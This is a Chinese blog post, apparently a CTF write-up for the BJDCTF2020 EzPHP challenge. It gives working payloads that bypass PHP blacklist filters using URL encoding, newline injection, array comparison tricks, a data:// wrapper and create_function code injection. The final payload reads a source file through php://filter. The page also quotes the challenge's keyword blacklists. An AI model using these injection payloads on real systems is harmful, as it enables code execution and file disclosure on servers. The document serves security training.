@@ -1,0 +1,279 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8" />
+    <title>[BJDCTF2020]EzPHP | why</title>
+    <meta name="author" content="why" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>WHY</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;WHY</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>[BJDCTF2020]EzPHP</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/6/20
+        </span>
+        
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p>查看源代码</p>
+<p>发现</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202042149.png" alt="image-20240620204218107"></p>
+<p>base32解码，得1nD3x.php</p>
+<p>访问，得到一长串代码，分开来一个个读（因为很像一关关闯关）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($_SERVER) &#123; </span><br><span class="line">  if (</span><br><span class="line">    preg_match(&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;])</span><br><span class="line">    ) </span><br><span class="line">    die(&#x27;You seem to want to do something bad?&#x27;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>啊，基本上全部ban掉了啊</p>
+<p>怎么办…</p>
+<p>在这里我们可以将要上传的东西进行url编码，因为$_SERVER[‘QUERY_STRING’]不会解码url</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (!preg_match(&#x27;/http|https/i&#x27;, $_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">    if (preg_match(&#x27;/^aqua_is_cute$/&#x27;, $_GET[&#x27;debu&#x27;]) &amp;&amp; $_GET[&#x27;debu&#x27;] !== &#x27;aqua_is_cute&#x27;) &#123; </span><br><span class="line">        $file = $_GET[&quot;file&quot;]; </span><br><span class="line">        echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; else die(&#x27;fxck you! What do you want to do ?!&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>之后就是要上传debu，满足debu的值为**&#x2F;^aqua_is_cute$&#x2F;<strong>，但是不能强等于</strong>aqua_is_cute**所以我们可以采用%0a换行符进行绕过，同时url绕过黑名单，所以payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deb%75=aq%75a_is_c%75te%0a//%75=u</span><br></pre></td></tr></table></figure>
+
+<p>之后</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($_REQUEST) &#123; </span><br><span class="line">    foreach($_REQUEST as $value) &#123; </span><br><span class="line">        if(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value))  </span><br><span class="line">            die(&#x27;fxck you! I hate English!&#x27;); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>$_REQUEST也就是说我们可以传get和post，同时，post优先级高于get，所以可以在个体传入之后用post覆盖</p>
+<p>该阶段payload如下：</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202051044.png" alt="image-20240620205138007"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (file_get_contents($file) !== &#x27;debu_debu_aqua&#x27;)</span><br><span class="line">    die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>也就是说要能读取到debu_debu_aqua</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=data://text/plain.deb%75_deb%75_aq%75a</span><br></pre></td></tr></table></figure>
+
+<p>所以用data伪协议写进去就好</p>
+<p>payload:</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202102099.png" alt="image-20240620210212072"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[&quot;flag&quot;]);</span><br><span class="line">    echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;</span><br><span class="line">&#125; else&#123;</span><br><span class="line">    die(&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>强比较，可以用数组绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh%61na[]=1&amp;p%61sswd[]=2</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(preg_match(&#x27;/^[a-z0-9]*$/isD&#x27;, $code) || </span><br><span class="line">preg_match(&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;, $arg) ) &#123; </span><br><span class="line">    die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;); </span><br><span class="line">&#125; else &#123; </span><br><span class="line">    include &quot;flag.php&quot;;</span><br><span class="line">    $code(&#x27;&#x27;, $arg);</span><br><span class="line">&#125; ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里存在**create_function()<strong>注入，而</strong>create_function()**存在两个参数$args和$code。</p>
+<p>所以这里我们保证code传入create_function</p>
+<p>之后是arg参数</p>
+<p>可以使用get_defined_vars()输出所有变量，payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fl%61g[c%6de]=create_function&amp;fl%61g[%61rg]=&#125;var_dump(get_defined_vars());//</span><br></pre></td></tr></table></figure>
+
+<p>所以总payload为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?deb%75=aq%75a_is_c%75te%0a</span><br><span class="line">&amp;file=data://text/plain,deb%75_deb%75_aq%75a</span><br><span class="line">&amp;sh%61na[]=1&amp;p%61sswd[]=2</span><br><span class="line">&amp;fl%61g[c%6fde]=create_function</span><br><span class="line">&amp;fl%61g[%61rg]=&#125;var_dump(get_defined_vars());//</span><br></pre></td></tr></table></figure>
+
+<p>发现</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202109204.png"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202109193.png" alt="屏幕截图 2024-06-20 210915"></p>
+<p>重点在最后一句话</p>
+<p><strong>[“ffffffff11111114ggggg”]&#x3D;&gt; string(89) “Baka, do you think it’s so easy to get my flag? I hid the real flag in rea1fl4g.php 23333”</strong></p>
+<p>也就是说，flag在rea1fl4g.php</p>
+<p>访问一下</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202111541.png" alt="image-20240620211146512"></p>
+<p>尝试一下伪协议读取源码放在arg中进行读取</p>
+<p>因为之前过滤太多了，这里直接取反</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=rea1fl4g.php</span><br><span class="line">-&gt;</span><br><span class="line">%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fl%61g[%61rg]=&#125;require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));//</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202118606.png" alt="image-20240620211836564"></p>
+<p>base64解码得flag</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202120490.png"></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 why
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;why
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+<script src="/js/<file>"></script>
+<link rel="stylesheet" href="/css/<file>" />
+</body>
+</html>
